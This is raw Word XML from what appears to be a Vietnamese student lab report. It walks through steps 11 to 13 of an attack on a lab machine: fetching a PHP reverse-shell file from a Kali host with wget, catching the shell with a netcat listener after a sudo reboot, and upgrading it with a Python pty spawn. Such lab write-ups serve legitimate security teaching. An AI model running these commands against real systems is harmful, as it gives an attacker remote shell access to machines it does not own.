          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 11. Chuyển tệp reverse shell sang máy mục tiêu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF86280" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Mở HTTP server trên Kali và tải tệp revshell.php xuống thư mục web của máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE790E2" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECA7891" w14:textId="35C98CE1" w:rsidR="00C30521" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cd /var/www/html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E87671B" w14:textId="77777777" w:rsidR="00C30521" w:rsidRDefault="005D5D0D">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D5D0D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python3 -m http.server 9999</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AADF369" w14:textId="2B8B76A3" w:rsidR="00B57906" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cd /var/www/html</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>wget http://192.168.56.122:9999/revshell.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5FDDA8" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tệp revshell.php được tải về máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22644532" w14:textId="42DA994B" w:rsidR="00C30521" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5737A21E" wp14:editId="13E40377">
            <wp:extent cx="6309360" cy="1691005"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="151976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665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D3D2" w14:textId="250D07D7" w:rsidR="00B57906" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="47B1065C" wp14:editId="6D4DCFFC">
            <wp:extent cx="6309360" cy="935990"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="62276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628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000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="74171E4A" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 12. Nhận kết nối reverse shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F1F897" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Mở cổng lắng nghe trên Kali, khởi động lại máy mục tiêu và truy cập tệp revshell.php để kích hoạt kết nối.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDA8E80" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41998F94" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>nc -nlvp 4448</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>sudo /bin/systemctl reboot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>http://192.168.56.125/revshell.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B25FAC1" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Máy Kali nhận được phiên reverse shell từ máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09344999" w14:textId="77777777" w:rsidR="00C30521" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="80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6078B8A7" wp14:editId="1250BAE8">
            <wp:extent cx="5924550" cy="1800225"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="77700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006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3027" w14:textId="77777777" w:rsidR="00C30521" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="596F19F1" wp14:editId="0372CF51">
            <wp:extent cx="6309360" cy="1160780"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="95547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755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929C" w14:textId="77777777" w:rsidR="00C30521" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="066BD178" wp14:editId="48504068">
            <wp:extent cx="6309360" cy="1094740"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="45349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925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935B" w14:textId="5E177D9F" w:rsidR="00B57906" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="463B2EE1" wp14:editId="5D2C155A">
            <wp:extent cx="6309360" cy="1126490"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="64853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392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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="020DD90A" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 13. Nâng cấp shell tương tác</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684BF2FA" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Sử dụng Python PTY để chuyển shell hiện tại thành shell tương tác ổn định hơn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B55051" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD708B1" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sudo python -c 'import pty; pty.spawn("/bin/bash")'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26756344" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Thu được shell tương tác với quyền tương ứng của tài khoản khai thác.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149D616F" w14:textId="20881D32" w:rsidR="00B57906" w:rsidRDefault="00C30521">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20D4CF79" wp14:editId="0CD9F385">
            <wp:extent cx="6309360" cy="1550035"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="88362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267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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00B5790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824020">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="249584323">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="350763377">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="221840337">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="191110268">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1347706441">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="2079159790">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="720981663">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1060327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5D0D"/>
    <w:rsid w:val="006E4573"/>
    <w:rsid w:val="007702DC"/>
    <w:rsid w:val="008B3E8C"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B57906"/>
    <w:rsid w:val="00BB3630"/>
    <w:rsid w:val="00C30521"/>
    <w:rsid w:val="00C83CB3"/>
    <w:rsid w:val="00CA3328"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E50A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5903CBB"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{47885956-6CF4-4E2A-A6B8-A8DB0525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702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2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14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Manh Duc 20230247P</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-28T11:43:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>